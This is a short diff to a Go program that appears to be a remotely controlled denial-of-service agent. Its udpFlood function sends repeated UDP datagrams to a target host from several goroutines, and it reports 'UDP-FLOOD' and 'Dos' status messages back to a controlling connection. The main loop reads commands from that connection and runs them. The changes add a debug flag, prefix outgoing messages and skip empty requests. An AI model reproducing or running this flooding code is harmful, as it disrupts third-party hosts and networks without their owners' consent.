@@ -34,12 +34,19 @@ func udpFlood(host string, port string, pkg_c int, conn net.Conn) {
 	udpString := "<UDP>BABABUUY<UDP>"
 	data, serverAddr := CreateUdpDatagramm(udpString, host, port)
 
-	s := fmt.Sprintf("UDP-FLOOD start pkg[ %d ] & host- %s -", pkg_c, host)
+	s := fmt.Sprintf("UDP-FLOOD start pkg[ %d ] & host- %s", pkg_c, host)
 
 	sendData(conn, s)
+	debug_flag := false
 
 	if pkg_c > 0 {
 		for i := 0; i <= pkg_c; i++ {
+
+			if debug_flag {
+				sd := fmt.Sprintf("Dos - pkg[%d]", i)
+				sendData(conn, sd)
+			}
+
 			sendUdp(data, serverAddr)
 			go sendUdp(data, serverAddr)
 			go sendUdp(data, serverAddr)
@@ -50,8 +57,10 @@ func udpFlood(host string, port string, pkg_c int, conn net.Conn) {
 }
 
 func sendData(conn net.Conn, data string) {
-	_, err := conn.Write([]byte(data))
-	fmt.Println("[Send] " + data)
+	dataT := "~" + data
+	_, err := conn.Write([]byte(dataT))
+	fmt.Println("[Send] " + dataT)
+
 	if err != nil {
 		fmt.Println("Error sending data:", err)
 		return
@@ -109,7 +118,9 @@ func main() {
 		n, _ := conn.Read(buffer)
 		req := string(buffer[:n])
 
-		source(req, conn)
+		if req != "" {
+			source(req, conn)
+		}
 
 	}
 }
